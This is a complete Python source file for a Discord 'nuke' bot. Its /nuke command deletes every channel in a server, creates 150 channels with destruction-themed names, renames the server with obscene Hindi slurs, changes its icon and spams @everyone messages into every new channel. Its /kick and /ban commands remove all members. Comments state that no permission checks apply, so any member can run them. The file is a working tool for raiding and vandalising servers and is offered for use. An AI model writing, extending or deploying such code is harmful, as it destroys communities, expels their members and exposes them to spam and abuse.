import discord
from discord.ext import commands
import os
from dotenv import load_dotenv
import asyncio
from PIL import Image, ImageDraw
from io import BytesIO

load_dotenv()

# Bot setup
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="/", intents=intents)

@bot.event
async def on_ready():
    print(f'{bot.user} has connected to Discord!')
    print(f'Bot is ready and online!')
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} command(s)")
    except Exception as e:
        print(e)

# /start command - Bot status
@bot.tree.command(name="start", description="Check if bot is running")
async def start(interaction: discord.Interaction):
    await interaction.response.send_message("✅ Bot is running and online! 24/7 active!")

# Server name and avatar
FUNNY_NAMES = [
    "🍆 LOUDA LASSAN",
    "💦 MUTH BAZI",
    "🍑 GAND MARO",
    "💋 CHUDAI KI DUKAAN",
    "🔞 ADULT ZONE",
    "🍌 LASSAN PARTY",
    "🌮 TACO TUESDAY",
    "🚀 ROCKET FUELED",
    "💥 CHAOS CENTRAL",
    "🎉 PARTY HARD",
]

# Channel name generator
def generate_channel_names(count=150):
    names = []
    emojis = ["💀", "☢️", "💣", "🔥", "☠️", "🧨", "💥", "⚠️", "🚨"]
    descriptors = [
        "destroyed", "nuked", "nuke-zone", "burnt-zone", "dead-zone", "chaos-zone",
        "exploded", "system-crashed", "radioactive", "graveyard", "hell-zone", "bombed",
        "total-destruction", "chaos-room", "everything-gone", "critical-damage", "nuclear-zone",
        "rip-server", "burning-zone", "detonation", "fallen-zone", "blast-zone", "impact-zone",
        "nuclear-fallout", "dead-server", "inferno", "war-zone", "no-survivors"
    ]
    
    for i in range(count):
        emoji = emojis[i % len(emojis)]
        descriptor = descriptors[i % len(descriptors)]
        names.append(f"{emoji}・{descriptor}-{i+1}")
    
    return names

# Spam messages
SPAM_MESSAGES = [
    "🚨💀 @everyone 💀🚨\n\n☢️━━━━━━━━━━━━━━━━━━━━☢️\n💣 𝐂𝐇𝐀𝐎𝐒 𝐀𝐋𝐄𝐑𝐓 💣\n☢️━━━━━━━━━━━━━━━━━━━━☢️\n\n🔥 Server ka mahaul ab full CHAOS mode mein hai! 🔥\n💀 Sabhi members ready raho — kuch bhi ho sakta hai!\n☠️━━━━━━━━━━━━━━━━━━━━☠️",
    
    "💥 𝐃𝐄𝐒𝐓𝐑𝐎𝐘 • 𝐍𝐔𝐊𝐄 • 𝐂𝐇𝐀𝐎𝐒 • 𝐃𝐎𝐎𝐌 💥\n\n🧨 Rules check karo\n☢️ Channels check karo\n💣 Notifications check karo\n🔥 Aur apni team ko ready rakho!",
    
    "⚠️━━━━━━━━━━━━━━━━━━━━⚠️\n🚨 𝐅𝐈𝐍𝐀𝐋 𝐖𝐀𝐑𝐍𝐈𝐍𝐆 🚨\n⚠️━━━━━━━━━━━━━━━━━━━━⚠️\n\n💀 Jo hone wala hai uske liye ready raho...\n🧨 CHAOS IS COMING 🧨\n☢️ THE SERVER IS WATCHING ☢️\n🔥 LET THE CHAOS BEGIN 🔥",
    
    "💥━━━━━━━━━━━━━━━━━━━━💥\n☠️ 𝐃𝐎𝐎𝐌 𝐌𝐎𝐃𝐄 ☠️\n💥━━━━━━━━━━━━━━━━━━━━💥\n\n📢 @everyone — sabko inform kar diya gaya hai.\n🫡 Ab dekhte hain kaun last tak tikta hai... 😈",
    
    "🚨 ALL SYSTEMS DOWN 🚨\n💀 THE NUKE IS ACTIVE 💀\n☠️ EVERYONE IS AFFECTED ☠️\n🔥 NO ESCAPE POSSIBLE 🔥",
]

# Create cat avatar image
def create_cat_avatar():
    img = Image.new('RGB', (100, 100), color='#FFB366')
    draw = ImageDraw.Draw(img)
    
    # Draw face
    draw.ellipse([10, 15, 90, 85], fill='#FFB366', outline='#000000', width=2)
    
    # Draw ears
    draw.polygon([(20, 20), (25, 5), (35, 20)], fill='#FFB366', outline='#000000')
    draw.polygon([(65, 20), (75, 5), (80, 20)], fill='#FFB366', outline='#000000')
    
    # Draw eyes
    draw.ellipse([25, 35, 35, 45], fill='#000000')
    draw.ellipse([65, 35, 75, 45], fill='#000000')
    
    # Draw nose
    draw.polygon([(48, 52), (50, 58), (52, 52)], fill='#FF69B4')
    
    # Draw mouth
    draw.arc([(40, 55), (60, 70)], 0, 180, fill='#000000', width=2)
    
    img_byte_arr = BytesIO()
    img.save(img_byte_arr, format='PNG')
    img_byte_arr.seek(0)
    return img_byte_arr.getvalue()

# Confirmation view with buttons
class ConfirmView(discord.ui.View):
    def __init__(self, timeout=60):
        super().__init__(timeout=timeout)
        self.confirmed = False

    @discord.ui.button(label="✅ CONFIRM NUKE", style=discord.ButtonStyle.danger)
    async def confirm_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        self.confirmed = True
        for child in self.children:
            child.disabled = True
        await interaction.message.edit(view=self)
        self.stop()

    @discord.ui.button(label="❌ CANCEL", style=discord.ButtonStyle.secondary)
    async def cancel_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        for child in self.children:
            child.disabled = True
        await interaction.message.edit(view=self, content="❌ Nuke cancelled!")
        self.stop()

# /nuke command - Delete all channels, create new ones, rename server, change avatar, spam
# ✅ NO CHECKS - ALL MEMBERS CAN USE
@bot.tree.command(name="nuke", description="Complete server nuke - delete, create, rename, avatar, spam")
async def nuke(interaction: discord.Interaction):
    await interaction.response.defer()
    
    guild = interaction.guild
    bot_member = guild.me
    
    if not guild:
        await interaction.followup.send("❌ This command can only be used in a server!")
        return
    
    # Check if bot has required permissions
    if not bot_member.guild_permissions.manage_channels:
        await interaction.followup.send("❌ Bot needs MANAGE_CHANNELS permission!")
        return
    
    if not bot_member.guild_permissions.manage_guild:
        await interaction.followup.send("❌ Bot needs MANAGE_GUILD permission!")
        return
    
    if not bot_member.guild_permissions.send_messages:
        await interaction.followup.send("❌ Bot needs SEND_MESSAGES permission!")
        return
    
    # Show confirmation button
    view = ConfirmView()
    await interaction.followup.send("⚠️ **ARE YOU SURE?** This will NUKE the entire server! Click to confirm!", view=view)
    await view.wait()
    
    if not view.confirmed:
        return
    
    try:
        # STEP 1: Delete all channels
        channels = list(guild.channels)
        total_channels = len(channels)
        deleted_count = 0
        
        await interaction.followup.send(f"🔄 **STEP 1:** Deleting {total_channels} channels...")
        
        for channel in channels:
            try:
                await channel.delete()
                deleted_count += 1
                print(f"Deleted channel: {channel.name}")
                await asyncio.sleep(0.2)
            except Exception as e:
                print(f"Failed to delete {channel.name}: {e}")
        
        await interaction.followup.send(f"✅ Deleted {deleted_count}/{total_channels} channels!")
        await asyncio.sleep(1)
        
        # STEP 2: Create new channels - LIMITED TO 150
        await interaction.followup.send(f"🔄 **STEP 2:** Creating 150 new channels...")
        
        channel_names = generate_channel_names(150)
        created_count = 0
        new_channels = []
        
        for i, channel_name in enumerate(channel_names):
            try:
                ch = await guild.create_text_channel(channel_name)
                new_channels.append(ch)
                created_count += 1
                
                if created_count % 25 == 0:
                    await interaction.followup.send(f"📊 Progress: {created_count}/150 channels created...")
                
                await asyncio.sleep(0.3)
            except Exception as e:
                print(f"Failed to create {channel_name}: {e}")
                await asyncio.sleep(0.5)
        
        await interaction.followup.send(f"✅ Created {created_count}/150 new channels!")
        await asyncio.sleep(1)
        
        # STEP 3: Change server name
        import random
        new_name = random.choice(FUNNY_NAMES)
        try:
            await guild.edit(name=new_name)
            await interaction.followup.send(f"✅ **STEP 3:** Server renamed to: **{new_name}**")
            print(f"Server renamed to: {new_name}")
        except Exception as e:
            print(f"Failed to rename server: {e}")
            await interaction.followup.send(f"⚠️ Could not rename server: {e}")
        
        await asyncio.sleep(1)
        
        # STEP 4: Change server avatar
        try:
            cat_avatar = create_cat_avatar()
            await guild.edit(icon=cat_avatar)
            await interaction.followup.send(f"✅ **STEP 4:** Server avatar changed to cat! 🐱")
            print("Server avatar changed to cat")
        except Exception as e:
            print(f"Failed to change avatar: {e}")
            await interaction.followup.send(f"⚠️ Could not change avatar: {e}")
        
        await asyncio.sleep(1)
        
        # STEP 5: Spam messages in all new channels
        await interaction.followup.send(f"🔄 **STEP 5:** Spamming messages to all {created_count} channels...")
        
        total_spam_count = 0
        
        for i, channel in enumerate(new_channels):
            try:
                for msg in SPAM_MESSAGES:
                    try:
                        await channel.send(msg)
                        total_spam_count += 1
                        await asyncio.sleep(0.05)
                    except Exception as e:
                        print(f"Failed to send message: {e}")
                
                if (i + 1) % 25 == 0:
                    await interaction.followup.send(f"📊 Spam Progress: {i + 1}/{created_count} channels...")
            except Exception as e:
                print(f"Error in channel {i}: {e}")
        
        # Final summary
        await interaction.followup.send(
            f"\n🎉 **💥 COMPLETE NUKE SUCCESSFUL! 💥**\n\n"
            f"✅ Deleted: {deleted_count} channels\n"
            f"✅ Created: {created_count}/150 channels\n"
            f"✅ Spam Messages: {total_spam_count} sent\n"
            f"✅ Server Name: {new_name}\n"
            f"✅ Server Avatar: Cat Image 🐱\n\n"
            f"🔥 SERVER COMPLETELY NUKED! 🔥"
        )
        
    except Exception as e:
        await interaction.followup.send(f"❌ Error occurred: {str(e)}")
        print(f"Nuke command error: {e}")

# /kick command - Kick all members (NO CHECKS)
@bot.tree.command(name="kick", description="Kick all members from the server")
async def kick(interaction: discord.Interaction):
    await interaction.response.defer()
    
    guild = interaction.guild
    
    if not guild:
        await interaction.followup.send("❌ This command can only be used in a server!")
        return
    
    try:
        members = list(guild.members)
        total_members = len(members)
        kicked_count = 0
        
        await interaction.followup.send(f"🔄 Starting to kick {total_members} members...")
        
        for member in members:
            try:
                if member.id != interaction.user.id and not member.bot:
                    await member.kick(reason="Server chaos mode!")
                    kicked_count += 1
                    print(f"Kicked member: {member.name}")
                    await asyncio.sleep(0.1)
            except Exception as e:
                print(f"Failed to kick {member.name}: {e}")
        
        await interaction.followup.send(f"✅ 💥 KICKED {kicked_count}/{total_members} members!")
        
    except Exception as e:
        await interaction.followup.send(f"❌ Error occurred: {str(e)}")
        print(f"Kick command error: {e}")

# /ban command - Ban all members (NO CHECKS)
@bot.tree.command(name="ban", description="Ban all members from the server")
async def ban(interaction: discord.Interaction):
    await interaction.response.defer()
    
    guild = interaction.guild
    
    if not guild:
        await interaction.followup.send("❌ This command can only be used in a server!")
        return
    
    try:
        members = list(guild.members)
        total_members = len(members)
        banned_count = 0
        
        await interaction.followup.send(f"🔄 Starting to ban {total_members} members...")
        
        for member in members:
            try:
                if member.id != interaction.user.id and not member.bot:
                    await guild.ban(member, reason="Server chaos mode!")
                    banned_count += 1
                    print(f"Banned member: {member.name}")
                    await asyncio.sleep(0.1)
            except Exception as e:
                print(f"Failed to ban {member.name}: {e}")
        
        await interaction.followup.send(f"✅ 💥 BANNED {banned_count}/{total_members} members!")
        
    except Exception as e:
        await interaction.followup.send(f"❌ Error occurred: {str(e)}")
        print(f"Ban command error: {e}")

# Error handlers
@nuke.error
async def nuke_error(interaction: discord.Interaction, error: discord.app_commands.AppCommandError):
    await interaction.response.send_message(f"❌ Error: {str(error)}", ephemeral=True)

@kick.error
async def kick_error(interaction: discord.Interaction, error: discord.app_commands.AppCommandError):
    await interaction.response.send_message(f"❌ Error: {str(error)}", ephemeral=True)

@ban.error
async def ban_error(interaction: discord.Interaction, error: discord.app_commands.AppCommandError):
    await interaction.response.send_message(f"❌ Error: {str(error)}", ephemeral=True)

# Run bot
token = os.getenv('DISCORD_TOKEN')
if token:
    bot.run(token)
else:
    print("❌ DISCORD_TOKEN not found in .env file")
